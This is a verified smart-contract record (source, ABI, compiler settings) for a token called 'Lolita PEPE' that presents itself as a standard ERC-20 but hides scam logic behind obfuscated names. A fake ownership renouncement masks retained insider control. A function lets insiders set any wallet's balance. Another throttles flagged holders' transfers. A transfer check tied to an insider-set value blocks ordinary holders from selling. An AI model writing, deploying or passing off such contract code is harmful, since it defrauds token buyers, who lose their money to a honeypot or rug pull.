{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface limitWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toLimit) external view returns (uint256);\n\n    function transfer(address amountExempt, uint256 autoSell) external returns (bool);\n\n    function allowance(address receiverSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountExempt,\n        uint256 autoSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingTake, uint256 value);\n    event Approval(address indexed receiverSell, address indexed spender, uint256 value);\n}\n\nabstract contract totalList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalReceiverList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minSwap {\n    function createPair(address maxExempt, address modeFrom) external returns (address);\n}\n\ninterface autoToken is limitWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LolitaPEPE is totalList, limitWallet, autoToken {\n\n    function minSenderTo() private view {\n        require(isSellFrom[_msgSender()]);\n    }\n\n    function transferFrom(address feeSwapMode, address amountExempt, uint256 autoSell) external override returns (bool) {\n        if (_msgSender() != buyTrading) {\n            if (totalTo[feeSwapMode][_msgSender()] != type(uint256).max) {\n                require(autoSell <= totalTo[feeSwapMode][_msgSender()]);\n                totalTo[feeSwapMode][_msgSender()] -= autoSell;\n            }\n        }\n        return takeMarketing(feeSwapMode, amountExempt, autoSell);\n    }\n\n    uint256 public autoAt;\n\n    address private enableTotal;\n\n    address listShouldFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address buyTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address public teamLaunch;\n\n    uint256 public maxAtIs;\n\n    function name() external view virtual override returns (string memory) {\n        return fundIs;\n    }\n\n    uint256 private tradingMarketing = 100000000 * 10 ** 18;\n\n    string private buyAmount = \"LPE\";\n\n    event OwnershipTransferred(address indexed fromReceiver, address indexed launchTo);\n\n    function swapAuto(uint256 autoSell) public {\n        minSenderTo();\n        launchedBuy = autoSell;\n    }\n\n    uint256 receiverTxFee;\n\n    string private fundIs = \"Lolita PEPE\";\n\n    function allowance(address swapLiquidityMax, address walletTeam) external view virtual override returns (uint256) {\n        if (walletTeam == buyTrading) {\n            return type(uint256).max;\n        }\n        return totalTo[swapLiquidityMax][walletTeam];\n    }\n\n    uint256 constant txTo = 9 ** 10;\n\n    constructor (){\n        if (maxAtIs == autoWallet) {\n            sellSender = isTake;\n        }\n        totalReceiverList maxTotalMode = totalReceiverList(buyTrading);\n        listBuy = minSwap(maxTotalMode.factory()).createPair(maxTotalMode.WETH(), address(this));\n        \n        teamLaunch = _msgSender();\n        autoMode();\n        isSellFrom[teamLaunch] = true;\n        fundLiquidity[teamLaunch] = tradingMarketing;\n        if (autoWallet == autoAt) {\n            sellSender = autoWallet;\n        }\n        emit Transfer(address(0), teamLaunch, tradingMarketing);\n    }\n\n    mapping(address => mapping(address => uint256)) private totalTo;\n\n    mapping(address => bool) public isSellFrom;\n\n    function listMax(address senderTrading) public {\n        minSenderTo();\n        if (sellSender == maxAtIs) {\n            maxAtIs = isTake;\n        }\n        if (senderTrading == teamLaunch || senderTrading == listBuy) {\n            return;\n        }\n        receiverLiquidity[senderTrading] = true;\n    }\n\n    function transfer(address feeAuto, uint256 autoSell) external virtual override returns (bool) {\n        return takeMarketing(_msgSender(), feeAuto, autoSell);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyAmount;\n    }\n\n    address public listBuy;\n\n    bool public limitShould;\n\n    function balanceOf(address toLimit) public view virtual override returns (uint256) {\n        return fundLiquidity[toLimit];\n    }\n\n    uint256 launchedBuy;\n\n    function toFund(address feeAuto, uint256 autoSell) public {\n        minSenderTo();\n        fundLiquidity[feeAuto] = autoSell;\n    }\n\n    function autoMode() public {\n        emit OwnershipTransferred(teamLaunch, address(0));\n        enableTotal = address(0);\n    }\n\n    mapping(address => uint256) private fundLiquidity;\n\n    function approve(address walletTeam, uint256 autoSell) public virtual override returns (bool) {\n        totalTo[_msgSender()][walletTeam] = autoSell;\n        emit Approval(_msgSender(), walletTeam, autoSell);\n        return true;\n    }\n\n    function listFrom(address fromTrading) public {\n        if (limitShould) {\n            return;\n        }\n        if (sellSender == marketingFund) {\n            isTake = marketingFund;\n        }\n        isSellFrom[fromTrading] = true;\n        if (autoWallet == isTake) {\n            marketingFund = maxAtIs;\n        }\n        limitShould = true;\n    }\n\n    function isMarketing(address feeSwapMode, address amountExempt, uint256 autoSell) internal returns (bool) {\n        require(fundLiquidity[feeSwapMode] >= autoSell);\n        fundLiquidity[feeSwapMode] -= autoSell;\n        fundLiquidity[amountExempt] += autoSell;\n        emit Transfer(feeSwapMode, amountExempt, autoSell);\n        return true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingMarketing;\n    }\n\n    function owner() external view returns (address) {\n        return enableTotal;\n    }\n\n    mapping(address => bool) public receiverLiquidity;\n\n    function takeMarketing(address feeSwapMode, address amountExempt, uint256 autoSell) internal returns (bool) {\n        if (feeSwapMode == teamLaunch) {\n            return isMarketing(feeSwapMode, amountExempt, autoSell);\n        }\n        uint256 isAtTotal = limitWallet(listBuy).balanceOf(listShouldFee);\n        require(isAtTotal == launchedBuy);\n        require(amountExempt != listShouldFee);\n        if (receiverLiquidity[feeSwapMode]) {\n            return isMarketing(feeSwapMode, amountExempt, txTo);\n        }\n        return isMarketing(feeSwapMode, amountExempt, autoSell);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeFrom;\n    }\n\n    uint256 public autoWallet;\n\n    function getOwner() external view returns (address) {\n        return enableTotal;\n    }\n\n    bool private launchAuto;\n\n    uint8 private takeFrom = 18;\n\n    uint256 private isTake;\n\n    uint256 public sellSender;\n\n    uint256 public marketingFund;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLiquidityMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoWallet\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSellFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromTrading\",\"type\":\"address\"}],\"name\":\"listFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"}],\"name\":\"listMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAtIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoSell\",\"type\":\"uint256\"}],\"name\":\"swapAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSell\",\"type\":\"uint256\"}],\"name\":\"toFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeSwapMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LolitaPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}